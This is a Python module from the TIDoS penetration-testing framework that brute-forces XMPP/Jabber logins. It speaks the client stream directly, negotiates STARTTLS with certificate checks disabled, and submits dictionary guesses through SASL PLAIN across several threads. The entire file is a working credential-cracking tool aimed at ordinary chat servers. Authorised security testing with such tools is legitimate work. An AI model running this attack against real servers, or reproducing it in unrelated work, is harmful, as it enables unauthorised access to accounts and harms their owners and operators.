#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Dictionary brute force of XMPP (Jabber) logins.

sleekxmpp is dead and slixmpp drags in an asyncio stack that is fragile to
drive in a thread pool, so this speaks the client stream itself: it opens
the stream, does STARTTLS when the server requires it, and authenticates
with SASL PLAIN -- the one mechanism every server supports.
"""

from __future__ import annotations

import base64
import socket
import ssl

from core.methods import brute, modkit as kit
from core.methods.print import pbrute

info = "Brute force XMPP/Jabber credentials using SASL PLAIN over the client stream."
searchinfo = "XMPP Login Cracker"
properties = brute.options(port_default=5222, threads_default=4,
                           extra={"XMPP_DOMAIN": ["XMPP domain / vhost (blank = target host)", ""]})

_SASL = "urn:ietf:params:xml:ns:xmpp-sasl"
_TLS = "urn:ietf:params:xml:ns:xmpp-tls"


def _stream_header(domain):
    return ("<?xml version='1.0'?>"
            "<stream:stream to='{d}' xmlns='jabber:client' "
            "xmlns:stream='http://etherx.jabber.org/streams' "
            "version='1.0'>").format(d=domain).encode()


def _recv_until(sock, markers, timeout, limit=16384):
    sock.settimeout(timeout)
    buf = bytearray()
    while len(buf) < limit:
        try:
            chunk = sock.recv(2048)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        low = bytes(buf).lower()
        if any(m in low for m in markers):
            break
    return bytes(buf)


def _make_login(domain):
    def _try_login(ip, port, user, password, timeout):
        try:
            sock = socket.create_connection((ip, int(port)), timeout=timeout)
        except OSError as e:
            raise ConnectionError(str(e)) from e
        try:
            sock.sendall(_stream_header(domain))
            features = _recv_until(sock, (b"</stream:features>", b"<stream:features/>",
                                          b"</features>"), timeout).lower()
            if b"stream:error" in features or not features:
                raise ConnectionError("xmpp stream rejected")

            if b"starttls" in features:
                sock.sendall("<starttls xmlns='{}'/>".format(_TLS).encode())
                resp = _recv_until(sock, (b"proceed", b"failure"), timeout).lower()
                if b"proceed" not in resp:
                    raise ConnectionError("xmpp STARTTLS not accepted")
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=domain)
                sock.sendall(_stream_header(domain))
                _recv_until(sock, (b"</stream:features>", b"<stream:features/>",
                                   b"</features>"), timeout)

            token = base64.b64encode(b"\x00" + user.encode() + b"\x00" + password.encode()).decode()
            sock.sendall("<auth xmlns='{}' mechanism='PLAIN'>{}</auth>".format(_SASL, token).encode())
            verdict = _recv_until(sock, (b"<success", b"<failure"), timeout).lower()
            if b"<success" in verdict:
                return True
            if b"<failure" in verdict:
                return False        # SASL rejected these credentials
            raise ConnectionError("no SASL response from xmpp server")
        except (ConnectionError, socket.timeout):
            raise
        except (OSError, ssl.SSLError) as e:
            raise ConnectionError(str(e)) from e
        finally:
            try:
                sock.close()
            except OSError:
                pass
    return _try_login


def attack(target):
    pbrute("XMPP")
    domain = kit.option(properties, "XMPP_DOMAIN", "XMPP domain", kit.host(target))
    return brute.run(target, properties, proto="xmpp", port_default=5222,
              try_login=_make_login(domain or kit.host(target)),
              lvl2="xmppbrute", threads_default=4, service="XMPP")
